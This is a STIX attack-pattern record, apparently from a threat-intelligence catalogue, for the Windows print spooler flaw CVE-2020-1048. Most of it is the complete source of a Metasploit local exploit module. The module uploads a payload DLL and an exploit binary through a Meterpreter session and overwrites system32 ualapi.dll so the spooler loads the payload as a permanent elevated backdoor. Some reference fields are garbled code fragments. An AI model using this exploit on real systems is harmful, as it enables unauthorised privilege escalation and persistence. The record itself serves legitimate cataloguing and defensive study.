{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fffb1af2-6031-4d86-87f2-2f0061a2c0a5",
    "created": "2024-08-14T16:48:57.004453Z",
    "modified": "2024-08-14T16:48:57.004457Z",
    "name": "Microsoft Spooler Local Privilege Elevation Vulnerability",
    "description": " This exploit leverages a file write vulnerability in the print spooler service which will restart if stopped.  Because the service cannot be stopped long enough to remove the dll, there is no way to remove the dll once it is loaded by the service.  Essentially, on default settings, this module adds a permanent elevated backdoor.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/cve_2020_1048_printerdemon.rb",
            "external_id": "cve_2020_1048_printerdemon.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-1048"
        },
        {
            "source_name": "reference",
            "url": "https://windows-internals.com/printdemon-cve-2020-1048/"
        },
        {
            "source_name": "exploit_bin=exploit_data(CVE-2020-1048",
            "external_id": "cve-2020-1048-exe.Win32.exe)"
        },
        {
            "source_name": "exploit_bin=exploit_data(CVE-2020-1048",
            "external_id": "cve-2020-1048-exe.x64.exe)"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::Common\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Microsoft Spooler Local Privilege Elevation Vulnerability',\n        'Description' => %q{\n          This exploit leverages a file write vulnerability in the print spooler service\n          which will restart if stopped.  Because the service cannot be stopped long\n          enough to remove the dll, there is no way to remove the dll once\n          it is loaded by the service.  Essentially, on default settings, this module\n          adds a permanent elevated backdoor.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Yarden Shafir', # Original discovery\n          'Alex Ionescu', # Original discovery\n          'shubham0d', # PoC\n          'bwatters-r7' # msf module\n        ],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Targets' => [\n          [ 'Automatic', { 'Arch' => [ ARCH_X86, ARCH_X64 ] } ]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2019-11-04',\n        'References' => [\n          ['CVE', '2020-1048'],\n          ['URL', 'https://windows-internals.com/printdemon-cve-2020-1048/']\n        ],\n        'DefaultOptions' => {\n          'DisablePayloadHandler' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, SCREEN_EFFECTS ]\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('EXPLOIT_NAME',\n                    [true, 'The filename to use for the exploit binary (%RAND% by default).', \"#{Rex::Text.rand_text_alpha(6..14)}.exe\"]),\n      OptString.new('PAYLOAD_NAME',\n                    [true, 'The filename for the payload to be used on the target host (%RAND%.dll by default).', Rex::Text.rand_text_alpha(6..14).to_s]),\n      OptString.new('WRITABLE_DIR',\n                    [false, 'Path to write binaries (%TEMP% by default).', nil]),\n      OptString.new('OVERWRITE_DLL',\n                    [false, 'Filename to overwrite (%WINDIR%\\system32\\ualapi.dll by default).', nil]),\n      OptBool.new('RESTART_TARGET',\n                  [true, 'Restart the target after exploit (you will lose your session until a second reboot).', false]),\n      OptInt.new('EXECUTE_DELAY',\n                 [true, 'The number of seconds to delay between file upload and exploit launch', 3])\n    ])\n  end\n\n  def cve_2020_1048_privileged_filecopy(destination_file, source_file, exploit_path, target_arch, force_exploit: false)\n    # Upload Exploit\n    if target_arch == ARCH_X86\n      vprint_status('Using x86 binary')\n      exploit_bin = exploit_data('CVE-2020-1048', 'cve-2020-1048-exe.Win32.exe')\n    else\n      vprint_status('Using x64 binary')\n      exploit_bin = exploit_data('CVE-2020-1048', 'cve-2020-1048-exe.x64.exe')\n    end\n    vprint_status(\"Uploading exploit to #{sysinfo['Computer']} as #{exploit_path}\")\n    if file?(exploit_path)\n      print_error(\"#{exploit_path} already exists\")\n      return false unless force_exploit\n    end\n    fail_with(Failure::BadConfig, 'No exploit binary found') if exploit_bin.nil?\n    write_file(exploit_path, exploit_bin)\n    print_status(\"Exploit uploaded on #{sysinfo['Computer']} to #{exploit_path}\")\n\n    # Run Exploit\n    vprint_status('Running Exploit')\n    begin\n      output = cmd_exec('cmd.exe', \"/c #{exploit_path} #{destination_file} #{source_file}\")\n    rescue Rex::TimeoutError => e\n      elog('Caught timeout.  Exploit may be taking longer or it may have failed.', error: e)\n      print_error('Caught timeout.  Exploit may be taking longer or it may have failed.')\n    end\n    output\n  end\n\n  def exploit\n    exploit_name = datastore['EXPLOIT_NAME']\n    vprint_status(\"exploit_name = #{exploit_name}\")\n    exploit_name = \"#{exploit_name}.exe\" unless exploit_name.end_with?('.exe')\n    payload_name = datastore['PAYLOAD_NAME']\n    if datastore['OVERWRITE_TARGET'].nil? || datastore['OVERWRITE_TARGET'].empty?\n      win_dir = session.sys.config.getenv('windir')\n      overwrite_target = \"#{win_dir}\\\\system32\\\\ualapi.dll\"\n    else\n      overwrite_target = datastore['OVERWRITE_TARGET']\n    end\n    temp_path = datastore['WRITABLE_DIR'] || session.sys.config.getenv('TEMP')\n    payload_path = \"#{temp_path}\\\\#{payload_name}\"\n    exploit_path = \"#{temp_path}\\\\#{exploit_name}\"\n    payload_dll = generate_payload_dll\n\n    # Check target\n    vprint_status('Checking Target')\n    validate_active_host\n    validate_payload\n    fail_with(Failure::BadConfig, \"#{temp_path} does not exist on the target\") unless directory?(temp_path)\n\n    # Upload Payload\n    vprint_status('Uploading Payload')\n    ensure_clean_destination(payload_path)\n    write_file(payload_path, payload_dll)\n    print_status(\"Payload (#{payload_dll.length} bytes) uploaded on #{sysinfo['Computer']} to #{payload_path}\")\n    print_warning(\"This exploit requires manual cleanup of the payload #{payload_path}\")\n    vprint_status(\"Sleeping for #{datastore['EXECUTE_DELAY']} seconds before launching exploit\")\n    sleep(datastore['EXECUTE_DELAY'])\n\n    # Run the exploit\n    output = cve_2020_1048_privileged_filecopy(overwrite_target, payload_path, exploit_path, sysinfo['Architecture'])\n    vprint_status(\"Exploit output:\\n#{output}\")\n    sleep(1) # make sure exploit is finished\n    vprint_status(\"Removing #{exploit_path}\")\n    session.fs.file.rm(exploit_path)\n\n    # Reboot, if desired\n    if datastore['RESTART_TARGET']\n      sleep(10)\n      vprint_status(\"Rebooting #{sysinfo['Computer']}\")\n      reboot_command = 'shutdown /r'\n      begin\n        cmd_exec('cmd.exe', \"/c #{reboot_command}\")\n      rescue Rex::TimeoutError => e\n        elog('Caught timeout.  Exploit may be taking longer or it may have failed.', error: e)\n        print_error('Caught timeout.  Exploit may be taking longer or it may have failed.')\n      end\n    end\n  end\n\n  def validate_active_host\n    print_status(\"Attempting to PrivEsc on #{sysinfo['Computer']} via session ID: #{datastore['SESSION']}\")\n  rescue Rex::Post::Meterpreter::RequestError => e\n    elog('Could not connect to session', error: e)\n    raise Msf::Exploit::Failed, 'Could not connect to session'\n  end\n\n  def validate_payload\n    vprint_status(\"Target Arch = #{sysinfo['Architecture']}\")\n    vprint_status(\"Payload Arch = #{payload.arch.first}\")\n    unless payload.arch.first == sysinfo['Architecture']\n      fail_with(Failure::BadConfig, 'Payload arch must match target arch')\n    end\n  end\n\n  def check\n    version = get_version_info\n\n    vprint_status(\"OS version: #{version}\")\n    return Exploit::CheckCode::Appears if version.build_number.between?(Msf::WindowsVersion::Win10_InitialRelease, Msf::WindowsVersion::Win10_1909)\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def ensure_clean_destination(path)\n    return unless file?(path)\n\n    print_status(\"#{path} already exists on the target. Deleting...\")\n    begin\n      file_rm(path)\n      print_status(\"Deleted #{path}\")\n    rescue Rex::Post::Meterpreter::RequestError => e\n      elog(e)\n      print_error(\"Unable to delete #{path}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-11-04",
    "x_mitre_platforms": [
        "['win']"
    ]
}